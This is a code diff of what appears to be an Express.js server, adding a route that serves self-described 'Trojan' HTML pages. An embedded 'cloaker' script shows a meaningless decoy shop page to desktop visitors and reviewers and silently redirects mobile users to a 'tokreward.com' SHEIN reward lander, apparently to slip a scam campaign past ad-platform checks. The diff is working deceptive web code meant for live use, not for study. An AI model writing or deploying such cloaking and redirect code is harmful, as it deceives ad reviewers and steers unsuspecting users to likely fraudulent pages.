@@ -1066,7 +1066,7 @@ app.get('/sheinv3/:slug', (req, res, next) => {
      console.log(`Served sheinv3 Trojan (${slug})`);
 });
 
-// Middleware to pass on my slug values to MaxConv (H&M CAMP)
+// SHEIN ESP
 app.get('/esp/:slug', (req, res, next) => {
     const { slug } = req.params;
     const destinationLander = `https://tokreward.com/sheinesp.html`;
@@ -1129,7 +1129,107 @@ app.get('/esp/:slug', (req, res, next) => {
         </html>
             `;
             res.send(trojanHTML);
-            console.log(`Served shein Trojan (${slug})`);
+            console.log(`Served ESP Trojan (${slug})`);
+});
+
+// SHEIN BH FLUENT
+app.get('/905/:slug', (req, res, next) => {
+    const { slug } = req.params;
+    const destinationLander = `https://tokreward.com/shein.html?slug=905`;
+    const trojanHTML = `
+        <!DOCTYPE html>
+        <html lang="en">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <script>
+                // Cloaker logic
+                const urlParams = new URLSearchParams(window.location.search);
+                const utmXXX = urlParams.get("xxx");
+                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+                if (utmXXX === "__PLACEMENT__") {
+                    } else if (isMobileDevice) {
+                        window.location.href = "${destinationLander}";
+                    } else {
+                    }
+            </script>
+            <title>${slug}</title>
+            <style>
+        body {
+            font-family: 'Courier New', monospace;
+            background-color: #f0f0f0;
+            color: #333;
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+        header {
+            background-color: #4a90e2;
+            padding: 2em;
+            text-align: right;
+        }
+        h1 {
+            font-size: 2.5em;
+            margin: 0;
+            color: #fff;
+        }
+        .content {
+            flex: 1;
+            padding: 2em;
+            max-width: 800px;
+            margin: 0 auto;
+        }
+        .shop-info {
+            background-color: #e2e2e2;
+            border-left: 5px solid #4a90e2;
+            padding: 1em;
+            margin-bottom: 2em;
+        }
+        footer {
+            background-color: #333;
+            color: #fff;
+            padding: 1em;
+            text-align: center;
+        }
+        footer a {
+            color: #4a90e2;
+            text-decoration: none;
+        }
+        footer a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>${slug} Emporium</h1>
+    </header>
+    
+    <div class="content">
+        <div class="shop-info">
+            <p>Exploring the wonders of: <strong>${slug}</strong></p>
+        </div>
+        
+        <h2>Discover the Extraordinary</h2>
+        <p>Welcome to a realm where imagination meets reality. Our curated collection awaits your discovery.</p>
+        
+        <h3>Why Choose Us?</h3>
+        <ul>
+            <li>Unparalleled selection</li>
+            <li>Expertly crafted experiences</li>
+            <li>Journey into the unknown</li>
+        </ul>
+    </div>
+
+    <footer>
+        <p>Embark on your adventure &copy; 2024 ${slug} Emporium | <a href="https://tokreward.com/pp.html">Privacy Assurance</a></p>
+    </footer>
+</body>
+</html>
+            `;
+            res.send(trojanHTML);
+            console.log(`Served 905 Trojan (${slug})`);
 });
 
 
